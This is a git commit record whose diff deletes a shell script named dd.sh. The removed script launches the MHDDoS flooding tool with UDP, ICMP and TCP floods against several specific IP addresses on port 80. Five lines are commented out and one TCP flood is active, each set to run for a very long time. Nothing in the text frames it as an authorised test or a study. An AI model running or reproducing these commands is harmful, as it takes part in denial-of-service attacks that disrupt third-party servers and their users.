cff0710cbb455c6510e6d9f09239ea1c35860cd2
rxyxxy <80524108+rxyxxy@users.noreply.github.com>
2024-11-08 16:57:20 +0800

    Delete dd.sh

--- dd.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-
-# python3 MHDDoS/start.py UDP 110.42.35.240:80 1 99999999 true &
-# python3 MHDDoS/start.py UDP 154.9.249.129:80 1 99999999 true &
-# python3 MHDDoS/start.py ICMP 153.121.71.128:80 1 99999999 true &
-# python3 MHDDoS/start.py UDP 45.154.15.226:80 1 99999999 true
-# python3 MHDDoS/start.py UDP 193.32.149.118:80 1 99999999 true &
-python3 MHDDoS/start.py TCP 156.238.250.25:80 10 99999999 true &
